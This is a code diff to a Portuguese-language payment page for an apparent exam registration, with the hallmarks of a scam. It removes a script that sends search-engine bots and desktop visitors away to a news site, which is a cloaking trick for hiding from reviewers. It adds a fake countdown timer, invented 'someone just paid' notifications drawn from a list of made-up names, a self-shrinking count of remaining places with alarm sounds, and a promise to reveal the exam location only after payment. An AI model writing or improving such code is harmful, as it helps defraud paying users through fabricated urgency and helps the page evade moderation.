@@ -9,42 +9,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     
     <!-- Verificação de dispositivo desktop -->
-    <script>
-        // Função para detectar se é um dispositivo móvel
-        function isMobile() {
-          return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        }
-        
-        // Função para detectar se é um bot
-        function isBot() {
-          const botAgents = [
-            'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
-            'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
-          ];
-        
-          return botAgents.some(bot => navigator.userAgent.includes(bot));
-        }
-        
-        // Função para verificar se a largura da janela é maior que 768px
-        function isWideScreen() {
-          return window.innerWidth > 768;
-        }
-        
-        // Redirecionar ou bloquear o acesso
-        function checkAccess() {
-          if (isBot() || (!isMobile() && isWideScreen())) {
-            // Redirecionar para o site G1 se o acesso for bloqueado
-            window.location.href = "https://g1.globo.com/";
-          }
-        }
-        
-        // Executar a função de verificação ao carregar a página
-        window.onload = checkAccess;
-        
-        // Adicionar um listener para verificar novamente se a janela for redimensionada
-        window.addEventListener('resize', checkAccess);
-    </script>
-    
+
     <!-- Facebook Pixel Code -->
     <script>
       !function(f,b,e,v,n,t,s)
@@ -128,6 +93,20 @@
             opacity: 0;
             transform: translateY(-20px);
             animation: slideDown 0.3s forwards, fadeOut 0.5s 5.5s forwards;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            border-left: 4px solid #4ade80;
+            max-width: 90%;
+            position: relative;
+        }
+        
+        /* Estilo para as notificações de alerta */
+        .alert-notification {
+            background-color: #D90000;
+            animation: slideDown 0.3s forwards, fadeOut 0.5s 6.5s forwards;
+            box-shadow: 0 4px 12px rgba(255, 0, 0, 0.25);
+            font-weight: bold;
             max-width: 90%;
             position: relative;
             display: flex;
@@ -185,6 +164,9 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             console.log("Inicializando página de pagamento");
+            
+            // Iniciar o contador regressivo de 10 minutos
+            startCountdown();
             
             // Tentar obter os dados do pagamento
             const paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}');
@@ -423,10 +405,62 @@
             "Juliana Lima", "Roberto Almeida", "Fernanda Costa", "Lucas Pereira",
             "Patricia Rodrigues", "Marcelo Gomes", "Luciana Ferreira", "Paulo Castro",
             "Cristina Rocha", "Ricardo Barbosa", "Amanda Cardoso", "Bruno Martins",
-            "Camila Ribeiro", "Daniel Alves", "Vanessa Carvalho", "Thiago Nunes"
+            "Camila Ribeiro", "Daniel Alves", "Vanessa Carvalho", "Thiago Nunes",
+            "Beatriz Mendes", "Gabriel Moreira", "Larissa Campos", "Rafael Dias",
+            "Isabela Teixeira", "Leandro Oliveira", "Carolina Lopes", "Gustavo Cunha",
+            "Natália Vieira", "Henrique Correia", "Mariana Duarte", "Felipe Nascimento",
+            "Renata Pinto", "Diego Machado", "Débora Azevedo", "Alexandre Moraes",
+            "Bianca Barros", "Marcos Neves", "Tatiana Freitas", "Leonardo Guimarães",
+            "Viviane Ramos", "Rodrigo Marques", "Aline Fernandes", "Vitor Andrade",
+            "Luiza Fonseca", "Guilherme Sales", "Jéssica Miranda", "Cláudio Gonçalves"
         ];
         
         // Função para mostrar notificações de pagamento
+        // Função para iniciar o contador regressivo
+        function startCountdown() {
+            const countdownElement = document.getElementById('expiration-date');
+            // Definir o tempo total em segundos (10 minutos = 600 segundos)
+            let timeLeft = 600;
+            
+            // Atualizar o contador a cada segundo
+            const countdownInterval = setInterval(() => {
+                // Calcular minutos e segundos restantes
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                // Formatar a exibição (MM:SS)
+                const formattedTime = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                // Atualizar o elemento na página
+                countdownElement.textContent = formattedTime;
+                
+                // Quando faltar menos de 1 minuto, destacar o contador
+                if (timeLeft <= 60) {
+                    countdownElement.style.color = '#FF0000'; // Vermelho
+                    countdownElement.style.fontWeight = 'bold';
+                    countdownElement.style.fontSize = '1.25em';
+                }
+                
+                // Decrementar o tempo restante
+                timeLeft--;
+                
+                // Se o tempo acabou
+                if (timeLeft < 0) {
+                    clearInterval(countdownInterval);
+                    countdownElement.textContent = '00:00';
+                    
+                    // Exibir mensagem quando o tempo acabar
+                    const warningMessage = document.getElementById('warning-message');
+                    warningMessage.textContent = 'TEMPO ESGOTADO! O desconto promocional expirou. Efetue o pagamento imediatamente para garantir sua vaga.';
+                    document.getElementById('warning-container').classList.remove('hidden');
+                }
+            }, 1000);
+        }
+        
+        // Variável global para controlar o número de vagas disponíveis
+        let vagasDisponiveis = 34;
+        let notificacoesDesdeUltimoAlerta = 0;
+        
         function showNotifications() {
             const container = document.getElementById('notifications-container');
             const notificationSound = document.getElementById('notification-sound');
@@ -438,6 +472,7 @@
             
             // Verificar se temos um bairro válido, caso contrário, usar um bairro padrão
             const neighborhood = bairro || "Centro";
+            const city = userCity || "sua cidade";
             
             // Função para reproduzir som
             function playSound() {
@@ -462,7 +497,32 @@
                 });
             }
             
+            // Função para reproduzir som de alerta (diferente)
+            function playAlertSound() {
+                const alertSound = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-alert-quick-chime-766.mp3');
+                alertSound.volume = 0.8;
+                
+                alertSound.play().catch(e => {
+                    console.error("Erro ao tocar som de alerta:", e);
+                    
+                    // Fallback
+                    try {
+                        const backupSound = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-software-interface-alert-2573.mp3');
+                        backupSound.volume = 0.8;
+                        backupSound.play().catch(e2 => console.error("Erro no fallback de som de alerta:", e2));
+                    } catch (e2) {
+                        console.error("Erro total ao tocar som de alerta:", e2);
+                    }
+                });
+            }
+            
             function showRandomNotification() {
+                // Verificar se já existe uma notificação ativa (para garantir que mostre apenas uma por vez)
+                if (container.querySelectorAll('.notification').length > 0) {
+                    // Se já existe uma notificação, tenta novamente mais tarde
+                    return;
+                }
+                
                 // Pegar um nome aleatório
                 const randomName = randomNames[Math.floor(Math.random() * randomNames.length)];
                 
@@ -490,18 +550,90 @@
                 setTimeout(() => {
                     notification.remove();
                 }, 7000);
+                
+                // Incrementar contador de notificações desde último alerta
+                notificacoesDesdeUltimoAlerta++;
+                
+                // Verificar se é hora de mostrar um alerta de vagas
+                if (notificacoesDesdeUltimoAlerta >= 4) {
+                    // Reduzir vagas disponíveis a cada ciclo de alerta
+                    vagasDisponiveis -= notificacoesDesdeUltimoAlerta;
+                    
+                    // Garantir que nunca fique abaixo de 1
+                    if (vagasDisponiveis < 1) vagasDisponiveis = 1;
+                    
+                    // Resetar contador
+                    notificacoesDesdeUltimoAlerta = 0;
+                    
+                    // Mostrar alerta após um pequeno delay para não coincidir com outra notificação
+                    setTimeout(() => {
+                        showVagasAlert();
+                    }, 1000);
+                }
+            }
+            
+            function showVagasAlert() {
+                // Verificar se já existe uma notificação ativa (para garantir que mostre apenas uma por vez)
+                if (container.querySelectorAll('.notification').length > 0) {
+                    // Se já existe uma notificação, tenta novamente mais tarde
+                    return;
+                }
+                
+                // Criar elemento de alerta
+                const alertNotification = document.createElement('div');
+                alertNotification.className = 'notification alert-notification';
+                
+                // Definir mensagem com base no número de vagas
+                let mensagem = '';
+                if (vagasDisponiveis <= 5) {
+                    mensagem = `<strong>URGENTE:</strong> Apenas ${vagasDisponiveis} ${vagasDisponiveis === 1 ? 'vaga restante' : 'vagas restantes'} para ${city}! Realize o pagamento imediatamente para não perder sua vaga!`;
+                } else {
+                    mensagem = `<strong>ATENÇÃO:</strong> Restam apenas ${vagasDisponiveis} vagas para ${city}. Garanta sua vaga completando a inscrição agora!`;
+                }
+                
+                alertNotification.innerHTML = `
+                    <div class="notification-icon" style="background-color: rgba(255, 0, 0, 0.2);">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                        </svg>
+                    </div>
+                    <div>
+                        ${mensagem}
+                    </div>
+                `;
+                
+                // Adicionar estilos especiais para alerta
+                alertNotification.style.backgroundColor = '#D90000';
+                alertNotification.style.fontWeight = 'bold';
+                
+                // Adicionar ao container
+                container.appendChild(alertNotification);
+                
+                // Reproduzir som de alerta
+                playAlertSound();
+                
+                // Remover após 8 segundos (um pouco mais longo que as notificações normais)
+                setTimeout(() => {
+                    alertNotification.remove();
+                }, 8000);
             }
             
             // Mostrar primeira notificação após 2 segundos
             setTimeout(() => {
-                showRandomNotification();
+                // Mostrar primeiro alerta de vagas
+                showVagasAlert();
                 
-                // Configurar intervalos aleatórios para mostrar notificações
-                setInterval(() => {
-                    // Intervalo aleatório entre 1-4 segundos
-                    const randomInterval = Math.floor(Math.random() * 3000) + 1000;
-                    setTimeout(showRandomNotification, randomInterval);
-                }, 7000); // Intervalo principal entre ciclos de notificações
+                // Em seguida mostrar notificação normal após um breve delay
+                setTimeout(() => {
+                    showRandomNotification();
+                    
+                    // Configurar intervalos aleatórios para mostrar notificações
+                    setInterval(() => {
+                        // Intervalo aleatório entre 1-4 segundos
+                        const randomInterval = Math.floor(Math.random() * 3000) + 1000;
+                        setTimeout(showRandomNotification, randomInterval);
+                    }, 7000); // Intervalo principal entre ciclos de notificações
+                }, 8500);
                 
             }, 2000);
         }
@@ -713,7 +845,7 @@
                 <div class="form-header py-3 px-4 text-center bg-red-600">
                     <h2 class="text-lg flex items-center justify-center text-white font-semibold">
                         <div class="animate-spin w-5 h-5 border-2 border-white border-t-transparent rounded-full mr-2"></div>
-                        <span class="blinking-text">AGUARDANDO PAGAMENTO</span>
+                        <span>AGUARDANDO PAGAMENTO</span>
                     </h2>
                 </div>
                 <!-- Content -->
@@ -750,7 +882,7 @@
                                 <div>
                                     <div class="p-3 bg-amber-50 border-l-4 border-amber-400 mb-3">
                                         <p class="text-amber-800 font-medium text-sm">Situação da inscrição:</p>
-                                        <p class="text-red-600 font-bold">PENDENTE - <span class="blinking-text">AGUARDANDO PAGAMENTO</span></p>
+                                        <p class="text-red-600 font-bold">PENDENTE - AGUARDANDO PAGAMENTO</p>
                                     </div>
                                     <div class="flex items-center mb-3">
                                         <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mr-3">
@@ -801,6 +933,21 @@
                                         <p class="font-medium text-green-600">99%</p>
                                     </div>
                                 </div>
+                            </div>
+                            <!-- Informações do local da prova -->
+                            <div class="mt-4 bg-blue-50 p-3 border-l-4 border-blue-400 rounded-r-md">
+                                <div class="flex items-start">
+                                    <div class="text-blue-500 mt-1 mr-2">
+                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4" />
+                                        </svg>
+                                    </div>
+                                    <div>
+                                        <p class="text-sm text-blue-800 font-medium">Local da prova: <span class="font-normal">Escola pública mais próxima da sua residência</span></p>
+                                        <p class="text-xs text-gray-600 mt-1">Após a confirmação do pagamento, você receberá seu Cartão de Confirmação com todas as informações da prova, incluindo o endereço completo da escola onde realizará o exame.</p>
+                                    </div>
+                                </div>
+                            </div>
                             </div>
                         </div>
                         
